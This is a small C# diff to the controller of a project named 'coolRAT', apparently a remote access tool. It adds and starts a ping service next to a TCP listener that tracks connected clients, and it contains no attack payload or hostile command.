@@ -27,6 +27,7 @@ namespace coolRAT.Master
         public static TcpListener ConnectionListener;
         public static Dictionary<Guid, Client> ConnectedClients;
         public static Action MainLoopTask;
+        public static PingService PingService;
 
         public static bool MainLoopAbort;
         public static ConnectionSettings Settings;
@@ -44,6 +45,9 @@ namespace coolRAT.Master
             ConnectedClients = new Dictionary<Guid, Client>();
             ConnectionListener = new TcpListener(new IPEndPoint(IPAddress.Any, Settings.Port));
             ConnectionListener.Start();
+
+            PingService = new PingService(new Dictionary<Guid, Client>());
+            PingService.Start();
             MainLoopTask = new Action(() =>
             {
                 while (!MainLoopAbort)
